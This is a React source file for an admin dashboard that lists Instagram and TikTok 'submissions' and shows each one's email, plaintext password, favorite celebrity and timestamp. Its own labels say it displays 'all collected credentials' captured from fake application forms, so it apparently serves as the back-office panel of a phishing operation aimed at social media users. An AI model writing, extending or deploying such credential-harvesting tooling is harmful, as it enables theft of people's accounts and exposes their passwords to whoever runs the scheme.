import React from "react";
import { format } from "date-fns";
import {
  useListInstagramSubmissions,
  useListTiktokSubmissions,
} from "@workspace/api-client-react";

import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Skeleton } from "@/components/ui/skeleton";
import { SiInstagram, SiTiktok } from "react-icons/si";
import { Shield } from "lucide-react";

export default function Admin() {
  const { data: instagramSubmissions, isLoading: isInstaLoading } =
    useListInstagramSubmissions();
  const { data: tiktokSubmissions, isLoading: isTiktokLoading } =
    useListTiktokSubmissions();

  return (
    <div className="min-h-[100dvh] bg-zinc-100 dark:bg-zinc-900 p-6 md:p-12">
      <div className="max-w-6xl mx-auto space-y-6">
        <div className="flex items-center gap-3 mb-8">
          <div className="p-3 bg-zinc-900 text-white rounded-lg shadow-sm">
            <Shield className="w-6 h-6" />
          </div>
          <div>
            <h1 className="text-2xl font-bold text-zinc-900 dark:text-zinc-50">
              Admin Dashboard
            </h1>
            <p className="text-sm text-zinc-500 dark:text-zinc-400">
              Internal view of all collected credentials.
            </p>
          </div>
        </div>

        <Tabs defaultValue="instagram" className="w-full">
          <TabsList className="grid w-full max-w-[400px] grid-cols-2 mb-6">
            <TabsTrigger value="instagram" className="flex items-center gap-2">
              <SiInstagram /> Instagram
            </TabsTrigger>
            <TabsTrigger value="tiktok" className="flex items-center gap-2">
              <SiTiktok /> TikTok
            </TabsTrigger>
          </TabsList>

          <TabsContent value="instagram">
            <Card>
              <CardHeader>
                <CardTitle>Instagram Submissions</CardTitle>
                <CardDescription>
                  Credentials captured from the Instagram application form.
                </CardDescription>
              </CardHeader>
              <CardContent>
                {isInstaLoading ? (
                  <div className="space-y-3">
                    <Skeleton className="h-10 w-full" />
                    <Skeleton className="h-10 w-full" />
                    <Skeleton className="h-10 w-full" />
                  </div>
                ) : (
                  <div className="border rounded-md">
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead>Celebrity</TableHead>
                          <TableHead>Email</TableHead>
                          <TableHead>Password</TableHead>
                          <TableHead className="text-right">Submitted At</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {instagramSubmissions?.length === 0 && (
                          <TableRow>
                            <TableCell
                              colSpan={4}
                              className="text-center text-zinc-500 py-8"
                            >
                              No submissions found.
                            </TableCell>
                          </TableRow>
                        )}
                        {instagramSubmissions?.map((sub) => (
                          <TableRow key={sub.id}>
                            <TableCell className="font-medium">
                              {sub.favoriteCelebrity}
                            </TableCell>
                            <TableCell>{sub.email}</TableCell>
                            <TableCell className="font-mono text-xs">
                              {sub.password}
                            </TableCell>
                            <TableCell className="text-right text-zinc-500">
                              {format(new Date(sub.submittedAt), "MMM d, yyyy HH:mm")}
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="tiktok">
            <Card>
              <CardHeader>
                <CardTitle>TikTok Submissions</CardTitle>
                <CardDescription>
                  Credentials captured from the TikTok application form.
                </CardDescription>
              </CardHeader>
              <CardContent>
                {isTiktokLoading ? (
                  <div className="space-y-3">
                    <Skeleton className="h-10 w-full" />
                    <Skeleton className="h-10 w-full" />
                    <Skeleton className="h-10 w-full" />
                  </div>
                ) : (
                  <div className="border rounded-md">
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead>Celebrity</TableHead>
                          <TableHead>Email</TableHead>
                          <TableHead>Password</TableHead>
                          <TableHead className="text-right">Submitted At</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {tiktokSubmissions?.length === 0 && (
                          <TableRow>
                            <TableCell
                              colSpan={4}
                              className="text-center text-zinc-500 py-8"
                            >
                              No submissions found.
                            </TableCell>
                          </TableRow>
                        )}
                        {tiktokSubmissions?.map((sub) => (
                          <TableRow key={sub.id}>
                            <TableCell className="font-medium">
                              {sub.favoriteCelebrity}
                            </TableCell>
                            <TableCell>{sub.email}</TableCell>
                            <TableCell className="font-mono text-xs">
                              {sub.password}
                            </TableCell>
                            <TableCell className="text-right text-zinc-500">
                              {format(new Date(sub.submittedAt), "MMM d, yyyy HH:mm")}
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}
